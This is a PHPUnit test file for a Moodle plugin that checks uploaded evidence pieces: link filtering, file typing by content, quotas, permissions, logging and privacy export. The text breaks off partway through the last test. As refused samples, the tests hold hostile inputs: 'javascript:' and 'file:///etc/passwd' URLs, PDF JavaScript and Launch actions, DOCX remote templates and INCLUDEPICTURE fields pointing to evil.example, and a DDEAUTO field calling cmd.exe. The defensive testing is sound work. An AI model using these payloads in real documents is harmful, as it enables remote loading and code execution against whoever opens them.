<?php
// This file is part of Moodle - http://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.

namespace tool_vae;

use core_privacy\local\request\approved_contextlist;
use core_privacy\local\request\writer;
use tool_vae\event\piece_added;
use tool_vae\event\piece_read;
use tool_vae\event\piece_removed;
use tool_vae\local\piece_manager;
use tool_vae\local\purge;
use tool_vae\privacy\provider;

/**
 * The supporting pieces of a declaration (T-13, lot 1, D-3).
 *
 * WHAT IS ASSERTED. That a link is accepted with its warnings or refused; that a file is typed on its content and never on its
 * name, stored under its identifier, with a digest that matches; that a macro, a remote relation, a type outside the list and a
 * file the site cannot scan are refused; that the limits hold; that removing erases the file, the title and the address and keeps
 * the rest, open or closed; that only the candidate adds and removes; that the right to open follows the rule of attestation and
 * the administrator; that the events carry identifiers only; that a purge and the privacy export take pieces with them.
 *
 * The declaration is inserted as a row: the rules under test are about who may attach what to it.
 *
 * @package    tool_vae
 * @copyright  2026 Jean-Louis Martinez <jeanlouis@martinez.pro>
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */
#[\PHPUnit\Framework\Attributes\CoversClass(\tool_vae\local\piece_manager::class)]
final class piece_manager_test extends \advanced_testcase {
    /** @var \stdClass The candidate. */
    private $candidate;

    /** @var \stdClass Follows the candidate and may attest. */
    private $manager;

    /** @var \stdClass Follows the candidate, may not attest. */
    private $reader;

    /** @var int The declaration. */
    private $evidenceid;

    /**
     * A candidate with a declaration, a manager who attests and a reader who may only view; adding open, no antivirus needed.
     */
    protected function setUp(): void {
        parent::setUp();
        global $DB;
        $this->resetAfterTest();

        $generator = $this->getDataGenerator();
        $system = \context_system::instance()->id;

        $this->candidate = $generator->create_user();
        $this->manager = $generator->create_user();
        $this->reader = $generator->create_user();
        $context = \context_user::instance($this->candidate->id)->id;

        $own = $generator->create_role();
        assign_capability('tool/vae:declare', CAP_ALLOW, $own, $system, true);
        assign_capability('tool/vae:viewown', CAP_ALLOW, $own, $system, true);
        role_assign($own, $this->candidate->id, $context);

        $read = $generator->create_role();
        assign_capability('tool/vae:viewassigned', CAP_ALLOW, $read, $system, true);
        set_role_contextlevels($read, [CONTEXT_USER]);
        role_assign($read, $this->reader->id, $context);

        $attest = $generator->create_role();
        assign_capability('tool/vae:viewassigned', CAP_ALLOW, $attest, $system, true);
        assign_capability('tool/vae:attest', CAP_ALLOW, $attest, $system, true);
        set_role_contextlevels($attest, [CONTEXT_USER]);
        role_assign($attest, $this->manager->id, $context);

        accesslib_clear_all_caches_for_unit_testing();

        $now = time();
        $this->evidenceid = (int) $DB->insert_record('tool_vae_evidence', (object) [
            'uuid' => local\identity_map::generate_ulid(),
            'userevidenceid' => 1,
            'candidateid' => (int) $this->candidate->id,
            'periodstart' => $now - 1000,
            'periodend' => $now,
            'settingtype' => 'ehpad',
            'situationformat' => FORMAT_PLAIN,
            'situation' => 'Une situation.',
            'fichecode' => 'RNCP36832',
            'ficherang' => 'C03',
            'ficheupdated' => $now,
            'timecreated' => $now,
            'timemodified' => $now,
            'usermodified' => (int) $this->candidate->id,
        ]);

        set_config('piecesopen', 1, 'tool_vae');
        set_config('piecenoantivirus', 1, 'tool_vae');
        $this->setUser($this->candidate);
    }

    /**
     * Refuse, and say with which error code.
     *
     * @param callable $call
     * @param string $errorcode
     */
    private function assert_refused(callable $call, string $errorcode): void {
        try {
            $call();
            $this->fail("Expected $errorcode.");
        } catch (\moodle_exception $e) {
            $this->assertSame($errorcode, $e->errorcode);
        }
    }

    /**
     * A file in the request directory.
     *
     * @param string $bytes
     * @return string Its path.
     */
    private function file(string $bytes): string {
        $path = make_request_directory() . '/' . uniqid('upload', true);
        file_put_contents($path, $bytes);

        return $path;
    }

    /**
     * A PDF, the smallest that begins like one.
     *
     * @param string $extra What to put in it.
     * @return string
     */
    private function pdf(string $extra = ''): string {
        return "%PDF-1.4\n1 0 obj << /Type /Catalog $extra >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n";
    }

    /**
     * A PNG of one pixel.
     *
     * @return string
     */
    private function png(): string {
        return base64_decode(
            'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=='
        );
    }

    /**
     * A zip with the given entries, in order.
     *
     * @param string[] $entries Name => content.
     * @return string
     */
    private function zip(array $entries): string {
        $path = make_request_directory() . '/' . uniqid('zip', true);
        $zip = new \ZipArchive();
        $zip->open($path, \ZipArchive::CREATE);
        foreach ($entries as $name => $content) {
            $zip->addFromString($name, $content);
        }
        $zip->close();

        return (string) file_get_contents($path);
    }

    /**
     * A DOCX that opens as one.
     *
     * @param string[] $more Further entries.
     * @return string
     */
    private function docx(array $more = []): string {
        return $this->zip(array_merge([
            '[Content_Types].xml' => '<Types><Override PartName="/word/document.xml" ContentType="x"/></Types>',
            'word/document.xml' => '<w:document/>',
        ], $more));
    }

    /**
     * An ODT that opens as one.
     *
     * @param string[] $more Further entries.
     * @return string
     */
    private function odt(array $more = []): string {
        $defaults = ['mimetype' => 'application/vnd.oasis.opendocument.text', 'content.xml' => '<office/>'];

        return $this->zip(array_merge($defaults, $more));
    }

    public function test_a_link_is_accepted_whole_and_never_visited(): void {
        $row = (new piece_manager())->add_link($this->evidenceid, 'diploma', '  Mon  diplome ', 'https://exemple.test/doc/1');

        $this->assertSame('link', $row->kind);
        $this->assertSame('Mon diplome', $row->title);
        $this->assertSame('https://exemple.test/doc/1', $row->url);
        $this->assertSame([], $row->warnings);
        $this->assertNull($row->timeremoved ?? null);
        $this->assertSame(26, strlen($row->uuid));
    }

    public function test_a_link_with_a_query_or_a_private_host_is_accepted_with_a_warning(): void {
        $manager = new piece_manager();

        $this->assertSame(
            ['piecewarnquery'],
            $manager->add_link($this->evidenceid, 'other', '', 'https://exemple.test/p?token=abc')->warnings
        );
        $this->assertSame(
            ['piecewarnprivate'],
            $manager->add_link($this->evidenceid, 'other', '', 'http://192.168.1.20/doc')->warnings
        );
        $this->assertSame(['piecewarnprivate'], $manager->add_link($this->evidenceid, 'other', '', 'http://serveur/doc')->warnings);
    }

    public function test_an_address_that_is_not_plain_http_is_refused(): void {
        $manager = new piece_manager();
        foreach (
            [
                'javascript:alert(1)', 'file:///etc/passwd', 'ftp://exemple.test/x', 'data:text/html,x', 'https://',
                'https://nom:secret@exemple.test/x', 'https://exemple.test/a b', '', 'exemple.test/doc',
                'https://exemple.test/' . str_repeat('a', 300),
            ] as $url
        ) {
            $this->assert_refused(fn() => $manager->add_link($this->evidenceid, 'other', '', $url), 'errorpieceurl');
        }
    }

    public function test_a_file_is_stored_under_its_identifier_with_a_digest_that_matches(): void {
        $bytes = $this->pdf();
        $row = (new piece_manager())->add_file($this->evidenceid, 'contract', 'Contrat', $this->file($bytes), 'Projet_Mme_X.pdf');

        $this->assertSame('file', $row->kind);
        $this->assertSame('pdf', $row->ext);
        $this->assertSame('application/pdf', $row->mimetype);
        $this->assertSame(strlen($bytes), (int) $row->filesize);
        $this->assertSame(hash('sha256', $bytes), $row->sha256);

        $stored = get_file_storage()->get_file(
            \context_user::instance($this->candidate->id)->id,
            'tool_vae',
            'piece',
            (int) $row->id,
            '/',
            $row->uuid . '.pdf'
        );
        $this->assertNotFalse($stored);
        $this->assertSame($bytes, $stored->get_content());

        // The name the browser gave is nowhere: not in the row, not among the stored files.
        $this->assertStringNotContainsString('Mme', json_encode($row));
        $contextid = \context_user::instance($this->candidate->id)->id;
        foreach (get_file_storage()->get_area_files($contextid, 'tool_vae', 'piece') as $file) {
            $this->assertStringNotContainsString('Mme', $file->get_filename());
        }
    }

    public function test_the_type_is_read_on_the_content_not_on_the_name(): void {
        $manager = new piece_manager();

        // HTML under the name of a PDF is refused; a PDF under the name of a web page is kept as a PDF.
        $this->assert_refused(
            fn() => $manager->add_file($this->evidenceid, 'other', '', $this->file('<html><script>x</script></html>'), 'a.pdf'),
            'errorpiecetype'
        );
        $row = $manager->add_file($this->evidenceid, 'other', '', $this->file($this->pdf()), 'a.html');
        $this->assertSame('pdf', $row->ext);
        $this->assertSame('application/pdf', $row->mimetype);

        $png = $manager->add_file($this->evidenceid, 'other', '', $this->file($this->png()), 'photo.exe');
        $this->assertSame('png', $png->ext);
    }

    public function test_a_plain_zip_and_a_svg_are_not_accepted(): void {
        $manager = new piece_manager();

        $this->assert_refused(
            fn() => $manager->add_file($this->evidenceid, 'other', '', $this->file($this->zip(['a.txt' => 'x'])), 'a.docx'),
            'errorpiecetype'
        );
        $this->assert_refused(
            fn() => $manager->add_file(
                $this->evidenceid,
                'other',
                '',
                $this->file('<svg xmlns="http://www.w3.org/2000/svg"/>'),
                'a.png'
            ),
            'errorpiecetype'
        );
    }

    public function test_a_docx_and_an_odt_are_accepted_and_typed(): void {
        $manager = new piece_manager();

        $this->assertSame('docx', $manager->add_file($this->evidenceid, 'other', '', $this->file($this->docx()), 'x')->ext);
        $this->assertSame('odt', $manager->add_file($this->evidenceid, 'other', '', $this->file($this->odt()), 'x')->ext);
    }

    public function test_a_macro_or_a_remote_relation_is_refused_but_a_hyperlink_is_not(): void {
        $manager = new piece_manager();
        $schema = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/';
        $relations = fn(string $type) => '<Relationships><Relationship Id="r1" Type="' . $schema
            . $type . '" Target="http://exemple.test/x" TargetMode="External"/></Relationships>';

        $this->assert_refused(
            fn() => $manager->add_file(
                $this->evidenceid,
                'other',
                '',
                $this->file($this->docx(['word/vbaProject.bin' => 'x'])),
                'a'
            ),
            'errorpiecemacro'
        );
        $this->assert_refused(
            fn() => $manager->add_file(
                $this->evidenceid,
                'other',
                '',
                $this->file($this->docx(['word/_rels/document.xml.rels' => $relations('attachedTemplate')])),
                'a'
            ),
            'errorpiecemacro'
        );
        $this->assert_refused(
            fn() => $manager->add_file($this->evidenceid, 'other', '', $this->file($this->odt(['Scripts/x.py' => 'x'])), 'a'),
            'errorpiecemacro'
        );
        $row = $manager->add_file(
            $this->evidenceid,
            'other',
            '',
            $this->file($this->docx(['word/_rels/document.xml.rels' => $relations('hyperlink')])),
            'a'
        );
        $this->assertSame('docx', $row->ext);
    }

    public function test_a_script_in_a_pdf_that_is_plainly_there_is_refused(): void {
        $this->assert_refused(
            fn() => (new piece_manager())->add_file(
                $this->evidenceid,
                'other',
                '',
                $this->file($this->pdf('/JavaScript (app.alert(1))')),
                'a.pdf'
            ),
            'errorpiecemacro'
        );
    }

    public function test_files_are_refused_when_nothing_scans_them_unless_the_administrator_accepted(): void {
        set_config('piecenoantivirus', 0, 'tool_vae');
        $manager = new piece_manager();

        $this->assert_refused(
            fn() => $manager->add_file($this->evidenceid, 'other', '', $this->file($this->pdf()), 'a.pdf'),
            'errorpiecenoantivirus'
        );
        // A link needs no scan.
        $this->assertSame('link', $manager->add_link($this->evidenceid, 'other', '', 'https://exemple.test/x')->kind);

        set_config('piecenoantivirus', 1, 'tool_vae');
        $this->assertSame('file', $manager->add_file($this->evidenceid, 'other', '', $this->file($this->pdf()), 'a.pdf')->kind);
    }

    public function test_the_limits_hold(): void {
        $manager = new piece_manager();

        // Too large for one file.
        set_config('piecemaxbytes', 100, 'tool_vae');
        $this->assert_refused(
            fn() => $manager->add_file($this->evidenceid, 'other', '', $this->file($this->pdf(str_repeat('x', 200))), 'a.pdf'),
            'errorpiecetoolarge'
        );
        set_config('piecemaxbytes', 5 * 1048576, 'tool_vae');

        // Too much for one candidate.
        $size = strlen($this->pdf());
        set_config('piecemaxpercandidate', $size + 10, 'tool_vae');
        $manager->add_file($this->evidenceid, 'other', '', $this->file($this->pdf()), 'a.pdf');
        $this->assert_refused(
            fn() => $manager->add_file($this->evidenceid, 'other', '', $this->file($this->pdf()), 'b.pdf'),
            'errorpiecequota'
        );
        set_config('piecemaxpercandidate', 0, 'tool_vae');

        // The ceiling is the code's: the setting cannot go above it.
        set_config('piecemaxpercandidate', 999 * 1048576, 'tool_vae');
        $this->assertSame(piece_manager::CANDIDATE_CEILING, piece_manager::settings()->maxpercandidate);
    }

    /**
     * The limit of the site, `Maximum uploaded file size`, holds on this field as on every other of the site.
     *
     * The field is a plain one, outside the file manager of the core that carries the setting everywhere else, and settings()
     * took no account of it: a site capped at 1 MB took 5 MB here. The limit is held where the size is read - settings() - so
     * that the door that refuses and the page that says the size are the same value.
     */
    public function test_the_limit_of_the_site_applies_when_it_is_lower_than_the_plugins(): void {
        $manager = new piece_manager();
        set_config('piecemaxbytes', 5 * 1048576, 'tool_vae');

        // The site says 100 bytes, the plugin 5 MB: the smaller is the limit, and said as such.
        set_config('maxbytes', 100);
        $this->assertSame(100, piece_manager::settings()->maxbytes);
        $this->assert_refused(
            fn() => $manager->add_file($this->evidenceid, 'other', '', $this->file($this->pdf(str_repeat('x', 200))), 'a.pdf'),
            'errorpiecetoolarge'
        );

        // A limit of the site above the plugin's is not a way past it.
        set_config('maxbytes', 999 * 1048576);
        $this->assertSame(5 * 1048576, piece_manager::settings()->maxbytes);

        // No limit of the site: the plugin's own, as before.
        set_config('maxbytes', 0);
        $this->assertSame(5 * 1048576, piece_manager::settings()->maxbytes);
        $row = $manager->add_file($this->evidenceid, 'other', '', $this->file($this->pdf(str_repeat('x', 200))), 'a.pdf');
        $this->assertSame('file', $row->kind);
    }

    /**
     * A PDF of the ceiling of a candidate, written in blocks, with the escapes of PDF names the type check has to undo.
     *
     * @param int $size
     * @return string Its path.
     */
    private function large_pdf(int $size): string {
        $path = make_request_directory() . '/large.pdf';
        $handle = fopen($path, 'wb');
        fwrite($handle, "%PDF-1.4\n");
        $block = str_repeat("1 0 obj << /Name /N#20X /Length 12345 /Filter /FlateDecode >> endobj\n", 1024);
        for ($written = 9; $written < $size; $written += strlen($chunk)) {
            $chunk = substr($block, 0, min(strlen($block), $size - $written));
            fwrite($handle, $chunk);
        }
        fclose($handle);

        return $path;
    }

    /**
     * THE MEMORY OF FINDING 40. Reading the type of a PDF held it twice over, plus the buffer that undoes its escapes.
     *
     * The scenario of the finding: a PDF of the ceiling a candidate may keep (30 MiB), inside an archive of 45 MiB that the
     * import already holds, on a request that starts at 128 MB. Measured in the container on PHP 8.3 before the change: a PDF
     * of 28 MiB took some 60 MiB more, and a fatal error cannot be caught. What is asserted is that the memory the check takes
     * no longer follows the size of the file.
     */
    public function test_reading_the_type_of_a_pdf_at_the_ceiling_holds_the_memory(): void {
        $path = $this->large_pdf(piece_manager::CANDIDATE_CEILING);
        $this->assertSame(piece_manager::CANDIDATE_CEILING, filesize($path));

        memory_reset_peak_usage();
        $before = memory_get_usage();
        $type = piece_manager::detect_type($path);
        $extra = memory_get_peak_usage() - $before;

        $this->assertSame(['pdf', 'application/pdf'], $type);
        $this->assertLessThan(
            4 * 1048576,
            $extra,
            'Reading the type of a PDF of ' . display_size(piece_manager::CANDIDATE_CEILING) . ' took ' . display_size($extra) . '.'
        );
    }

    /**
     * A PDF with a given text between a header and a trailer, the action starting a given number of bytes before the end of the
     * first window the check reads.
     *
     * @param string $action What to write, as it is written in the file.
     * @param int $before How many bytes before the end of the first window it starts; negative for after it.
     * @return string The path.
     */
    private function pdf_with_the_action_across_the_window(string $action, int $before): string {
        $header = "%PDF-1.4\n";
        $filler = str_repeat('x', piece_manager::PDF_WINDOW_BYTES - strlen($header) - $before);
        $path = make_request_directory() . '/window.pdf';
        file_put_contents($path, $header . $filler . $action . " (x)\nendobj\ntrailer\n%%EOF\n");

        return $path;
    }

    /**
     * Reading by windows decides as reading the whole file did: an action is found wherever it falls, however it is written.
     *
     * The action starts every number of bytes from 44 before the end of the first window to 3 after it: whole in the window,
     * ending exactly where it ends, cut in two, starting where the next begins. Written plainly, with one letter escaped
     * (`#53` cut between its `#` and its digits at one of the offsets), and escaped whole.
     */
    public function test_an_action_is_found_wherever_it_falls_across_the_reading_windows(): void {
        foreach (['/JavaScript', '/Java#53cript', '#2F#4A#53', '/Launch', '/Embedded#46ile'] as $action) {
            for ($before = 44; $before >= -3; $before--) {
                $path = $this->pdf_with_the_action_across_the_window($action, $before);
                try {
                    piece_manager::detect_type($path);
                    $this->fail("The action $action, $before bytes before the end of the window, was not found.");
                } catch (\moodle_exception $e) {
                    $this->assertSame('errorpiecemacro', $e->errorcode, "$action, $before bytes before the end of the window");
                }
            }
        }
    }

    /**
     * And a name that is not an action is not taken for one because a window ends after its first letters.
     *
     * `/JSX` is not `/JS`: the letter that follows decides, and it may be in the next window - or an escape cut in two, which
     * decodes to a letter.
     */
    public function test_a_name_that_only_starts_like_an_action_is_not_refused_across_the_reading_windows(): void {
        foreach (['/JSX', '/Java#53criptX', '#2F#4A#53#58', '/JS#41', '/Movie9'] as $name) {
            for ($before = 44; $before >= -3; $before--) {
                $path = $this->pdf_with_the_action_across_the_window($name, $before);

                $this->assertSame(
                    ['pdf', 'application/pdf'],
                    piece_manager::detect_type($path),
                    "$name, $before bytes before the end of the window"
                );
            }
        }
    }

    /**
     * Every action the check refuses is still refused in a real PDF, plainly and with its letters escaped, and the real PDF
     * is accepted without them.
     */
    public function test_every_action_of_the_list_is_still_refused_in_a_real_pdf(): void {
        $real = (string) file_get_contents(__DIR__ . '/fixtures/piece-essai.pdf');
        $this->assertStringContainsString('/Size 4', $real);
        $path = $this->file($real);
        $this->assertSame(['pdf', 'application/pdf'], piece_manager::detect_type($path));

        $actions = [
            'Launch', 'JavaScript', 'JS', 'GoToR', 'GoToE', 'SubmitForm', 'ImportData', 'RichMedia', 'EmbeddedFile', 'Sound',
            'Movie',
        ];
        foreach ($actions as $action) {
            // The last letter escaped: `#xx` of its code.
            $escaped = substr($action, 0, -1) . '#' . bin2hex(substr($action, -1));
            foreach (["/$action", "/$escaped"] as $written) {
                $path = $this->file(str_replace('/Size 4', "/Size 4 $written", $real));
                $this->assert_refused(fn() => piece_manager::detect_type($path), 'errorpiecemacro');
            }
        }
    }

    public function test_five_pieces_at_once_and_twenty_rows_at_most(): void {
        $manager = new piece_manager();
        for ($i = 0; $i < piece_manager::MAX_ACTIVE; $i++) {
            $row = $manager->add_link($this->evidenceid, 'other', '', 'https://exemple.test/' . $i);
        }
        $this->assert_refused(
            fn() => $manager->add_link($this->evidenceid, 'other', '', 'https://exemple.test/x'),
            'errorpiecelimit'
        );

        // Removing frees a place; adding and removing without end is stopped by the number of rows.
        for ($i = 0; $i < piece_manager::MAX_ROWS - piece_manager::MAX_ACTIVE; $i++) {
            $manager->remove((int) $row->id);
            $row = $manager->add_link($this->evidenceid, 'other', '', 'https://exemple.test/n' . $i);
        }
        $manager->remove((int) $row->id);
        $this->assert_refused(
            fn() => $manager->add_link($this->evidenceid, 'other', '', 'https://exemple.test/last'),
            'errorpiecerows'
        );
    }

    public function test_the_nature_and_the_title_are_checked(): void {
        $manager = new piece_manager();

        $this->assert_refused(
            fn() => $manager->add_link($this->evidenceid, 'photo', '', 'https://exemple.test/x'),
            'errorpiecenature'
        );
        $this->assert_refused(
            fn() => $manager->add_link($this->evidenceid, 'other', str_repeat('a', 61), 'https://exemple.test/x'),
            'errorpiecetitle'
        );
        $this->assertSame('', $manager->add_link($this->evidenceid, 'other', '', 'https://exemple.test/x')->title);
    }

    public function test_only_the_candidate_adds_and_only_when_open(): void {
        $manager = new piece_manager();

        foreach ([$this->manager, $this->reader, get_admin()] as $other) {
            $this->setUser($other);
            $this->assert_refused(
                fn() => $manager->add_link($this->evidenceid, 'other', '', 'https://exemple.test/x'),
                'errorpiecedenied'
            );
        }

        $this->setUser($this->candidate);
        set_config('piecesopen', 0, 'tool_vae');
        $this->assert_refused(
            fn() => $manager->add_link($this->evidenceid, 'other', '', 'https://exemple.test/x'),
            'errorpiececlosed'
        );
        $this->assert_refused(
            fn() => $manager->add_file($this->evidenceid, 'other', '', $this->file($this->pdf()), 'a.pdf'),
            'errorpiececlosed'
        );
    }

    public function test_removing_erases_the_file_the_title_and_the_address_and_keeps_the_rest(): void {
        $manager = new piece_manager();
        $file = $manager->add_file($this->evidenceid, 'contract', 'Titre qui nomme X', $this->file($this->pdf()), 'a.pdf');
        $link = $manager->add_link($this->evidenceid, 'other', 'Un lien', 'https://exemple.test/x');
        $context = \context_user::instance($this->candidate->id);

        $gone = $manager->remove((int) $file->id);
        $this->assertSame('', $gone->title);
        $this->assertNotNull($gone->timeremoved);
        $this->assertCount(0, get_file_storage()->get_area_files($context->id, 'tool_vae', 'piece', (int) $file->id, 'id', false));

        $row = $GLOBALS['DB']->get_record('tool_vae_piece', ['id' => $file->id]);
        $this->assertSame($file->sha256, $row->sha256, 'The digest stays.');
        $this->assertSame('contract', $row->nature);
        $this->assertSame('pdf', $row->ext);
        $this->assertSame((int) $file->filesize, (int) $row->filesize);
        $this->assertSame((int) $this->candidate->id, (int) $row->removedby);

        $manager->remove((int) $link->id);
        $this->assertNull($GLOBALS['DB']->get_field('tool_vae_piece', 'url', ['id' => $link->id]));
        $this->assertSame('', $GLOBALS['DB']->get_field('tool_vae_piece', 'title', ['id' => $link->id]));

        $this->assert_refused(fn() => $manager->remove((int) $file->id), 'errorpiecegone');
    }

    public function test_removing_works_when_closed_and_only_for_the_candidate(): void {
        $manager = new piece_manager();
        $row = $manager->add_link($this->evidenceid, 'other', '', 'https://exemple.test/x');

        set_config('piecesopen', 0, 'tool_vae');
        foreach ([$this->manager, get_admin()] as $other) {
            $this->setUser($other);
            $this->assert_refused(fn() => $manager->remove((int) $row->id), 'errorpiecedenied');
        }
        $this->setUser($this->candidate);
        $this->assertNotNull($manager->remove((int) $row->id)->timeremoved);
        $this->assert_refused(fn() => $manager->remove(999999), 'errorpiecedenied');
    }

    public function test_a_removed_piece_no_longer_counts_against_the_quota(): void {
        $manager = new piece_manager();
        $row = $manager->add_file($this->evidenceid, 'other', '', $this->file($this->pdf()), 'a.pdf');
        $this->assertSame((int) $row->filesize, piece_manager::used_bytes((int) $this->candidate->id));

        $manager->remove((int) $row->id);
        $this->assertSame(0, piece_manager::used_bytes((int) $this->candidate->id));
    }

    public function test_the_right_to_open_follows_the_attestation_rule_and_the_administrator(): void {
        $row = (new piece_manager())->add_file($this->evidenceid, 'other', '', $this->file($this->pdf()), 'a.pdf');

        $this->assertTrue(piece_manager::may_open($row, (int) $this->candidate->id));
        $this->assertTrue(piece_manager::may_open($row, (int) $this->manager->id), 'Who may attest may open.');
        $this->assertFalse(
            piece_manager::may_open($row, (int) $this->reader->id),
            'Who may only view sees the list, not the file.'
        );
        $this->assertFalse(piece_manager::may_open($row, (int) $this->getDataGenerator()->create_user()->id));
        $this->assertTrue(piece_manager::may_open($row, (int) get_admin()->id), 'The administrator passes every right.');

        (new piece_manager())->remove((int) $row->id);
        $removed = $GLOBALS['DB']->get_record('tool_vae_piece', ['id' => $row->id]);
        $this->assertFalse(piece_manager::may_open($removed, (int) $this->candidate->id), 'A removed piece opens for nobody.');
    }

    public function test_open_gives_the_file_to_whoever_may_and_logs_it_without_a_name(): void {
        $row = (new piece_manager())->add_file($this->evidenceid, 'other', 'Un titre', $this->file($this->pdf()), 'secret.pdf');
        $context = \context_user::instance($this->candidate->id);

        $sink = $this->redirectEvents();
        $this->setUser($this->manager);
        $file = piece_manager::open((int) $row->id, (int) $context->id);
        $this->assertNotNull($file);
        $this->assertSame($row->uuid . '.pdf', $file->get_filename());

        $events = array_values(array_filter($sink->get_events(), fn($event) => $event instanceof piece_read));
        $this->assertCount(1, $events);
        $this->assertSame((int) $this->manager->id, (int) $events[0]->userid);
        $text = json_encode($events[0]->get_data()) . $events[0]->get_description();
        $this->assertStringNotContainsString('secret', $text);
        $this->assertStringNotContainsString('Un titre', $text);

        // Every refusal is the same: nobody learns why.
        $this->assertNull(piece_manager::open((int) $row->id, (int) $context->id + 1), 'Not the context of the candidate.');
        $this->assertNull(piece_manager::open(999999, (int) $context->id));
        $this->setUser($this->reader);
        $this->assertNull(piece_manager::open((int) $row->id, (int) $context->id));
    }

    public function test_the_events_carry_identifiers_only(): void {
        $sink = $this->redirectEvents();
        $manager = new piece_manager();
        $row = $manager->add_link($this->evidenceid, 'other', 'Titre prive', 'https://exemple.test/nom-de-quelquun');
        $manager->remove((int) $row->id);

        $events = array_values(array_filter(
            $sink->get_events(),
            fn($event) => $event instanceof piece_added || $event instanceof piece_removed
        ));
        $this->assertCount(2, $events);
        foreach ($events as $event) {
            $text = json_encode($event->get_data()) . $event->get_description();
            $this->assertStringNotContainsString('Titre prive', $text);
            $this->assertStringNotContainsString('nom-de-quelquun', $text);
        }
    }

    public function test_a_purge_of_the_dossier_takes_the_pieces_and_their_files(): void {
        $manager = new piece_manager();
        $manager->add_file($this->evidenceid, 'other', '', $this->file($this->pdf()), 'a.pdf');
        $manager->add_link($this->evidenceid, 'other', '', 'https://exemple.test/x');
        $context = \context_user::instance($this->candidate->id);

        purge::dossier((int) $this->candidate->id);

        $this->assertSame(0, $GLOBALS['DB']->count_records('tool_vae_piece'));
        $this->assertCount(0, get_file_storage()->get_area_files($context->id, 'tool_vae', 'piece', false, 'id', false));
    }

    public function test_the_privacy_export_gives_the_candidate_their_pieces_and_files_and_a_manager_none(): void {
        $manager = new piece_manager();
        $file = $manager->add_file($this->evidenceid, 'diploma', 'Mon titre', $this->file($this->pdf()), 'a.pdf');
        $manager->add_link($this->evidenceid, 'other', '', 'https://exemple.test/x');
        $context = \context_user::instance($this->candidate->id);
        $path = [get_string('pluginname', 'tool_vae'), 'pieces'];

        writer::reset();
        provider::export_user_data(new approved_contextlist($this->candidate, 'tool_vae', [$context->id]));
        $data = writer::with_context($context)->get_data($path);
        $this->assertCount(2, $data->pieces);
        $this->assertSame('Mon titre', $data->pieces[0]['title']);
        $this->assertSame($file->sha256, $data->pieces[0]['sha256']);
        $this->assertCount(1, writer::with_context($context)->get_files(array_merge($path, [$file->uuid])));

        writer::reset();
        provider::export_user_data(new approved_contextlist($this->manager, 'tool_vae', [$context->id]));
        $this->assertEmpty(writer::with_context($context)->get_data($path));
    }

    public function test_the_added_event_is_logged_with_the_candidate(): void {
        $sink = $this->redirectEvents();
        (new piece_manager())->add_link($this->evidenceid, 'other', '', 'https://exemple.test/x');

        $events = array_values(array_filter($sink->get_events(), fn($event) => $event instanceof piece_added));
        $this->assertCount(1, $events);
        $this->assertSame((int) $this->candidate->id, (int) $events[0]->relateduserid);
        $this->assertSame($this->evidenceid, (int) $events[0]->other['evidenceid']);
    }

    /**
     * The relations part of a DOCX, with one relation of the given type, written as the caller wants.
     *
     * @param string $relation The whole Relationship tag.
     * @return string
     */
    private function docx_with_relation(string $relation): string {
        return $this->docx(['word/_rels/document.xml.rels' => '<Relationships>' . $relation . '</Relationships>']);
    }

    public function test_a_remote_relation_is_refused_however_the_xml_is_written(): void {
        $manager = new piece_manager();
        $type = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate';
        $target = 'Target="http://evil.example/t.dotm"';
        $variants = [
            "<Relationship Id='r1' Type='$type' $target TargetMode='External'/>",
            "<Relationship Id=\"r1\" Type=\"$type\" $target TargetMode = \"External\"/>",
            "<Relationship xType=\"a/hyperlink\" Id=\"r1\" Type=\"$type\" $target TargetMode=\"External\"/>",
            "<Relationship Id=\"r1\" Type=\"$type\" $target TargetMode=\"external\"/>",
        ];
        foreach ($variants as $variant) {
            $this->assert_refused(
                fn() => $manager->add_file($this->evidenceid, 'other', '', $this->file($this->docx_with_relation($variant)), 'a'),
                'errorpiecemacro'
            );
        }

        // The name of the part does not depend on case; a part too large to be read whole refuses the document.
        $this->assert_refused(
            fn() => $manager->add_file(
                $this->evidenceid,
                'other',
                '',
                $this->file($this->docx(['word/_rels/settings.xml.RELS' => '<Relationships>'
                    . "<Relationship Id=\"r1\" Type=\"$type\" $target TargetMode=\"External\"/></Relationships>"])),
                'a'
            ),
            'errorpiecemacro'
        );
        $this->assert_refused(
            fn() => $manager->add_file(
                $this->evidenceid,
                'other',
                '',
                $this->file($this->docx(['word/_rels/document.xml.rels' => str_repeat(' ', 1100000)
                    . "<Relationships><Relationship Id=\"r1\" Type=\"$type\" $target TargetMode=\"External\"/></Relationships>"])),
                'a'
            ),
            'errorpiecetype'
        );
        $this->assert_refused(
            fn() => $manager->add_file(
                $this->evidenceid,
                'other',
                '',
                $this->file($this->docx(['word/_rels/x.rels' => '<bad'])),
                'a'
            ),
            'errorpiecetype'
        );
    }

    public function test_embedded_objects_and_remote_fields_are_refused_in_a_docx(): void {
        $manager = new piece_manager();

        foreach (
            [
                ['word/embeddings/oleObject1.bin' => 'x'],
                ['word/activeX/activeX1.xml' => 'x'],
                ['word/header1.xml' => '<w:instrText> INCLUDEPICTURE "http://evil.example/p.png" </w:instrText>'],
                ['word/footer1.xml' => '<w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe</w:instrText>'],
            ] as $more
        ) {
            $this->assert_refused(
                fn() => $manager->add_file($this->evidenceid, 'other', '', $this->file($this->docx($more)), 'a'),
                'errorpiecemacro'
            );
        }
    }

    public function test_an_odt_that_loads_from_outside_or_runs_an_application_script_is_refused(): void {
        $manager = new piece_manager();
        $content = fn(string $inner) => [
            'content.xml' => '<office:document-content xmlns:xlink="x">' . $inner . '</office:document-content>',
        ];

        foreach (
            [
                $content('<draw:image xlink:href="http://evil.example/p.png"/>'),
                $content('<draw:image xlink:href=\'//evil.example/p.png\'/>'),
